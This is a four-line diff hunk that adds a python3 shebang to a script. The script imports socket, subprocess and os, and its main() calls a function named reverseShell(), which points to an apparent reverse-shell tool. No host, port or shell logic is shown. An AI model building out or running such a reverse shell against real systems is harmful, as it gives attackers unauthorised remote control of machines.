@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import socket, subprocess, os
 def main():
     reverseShell()
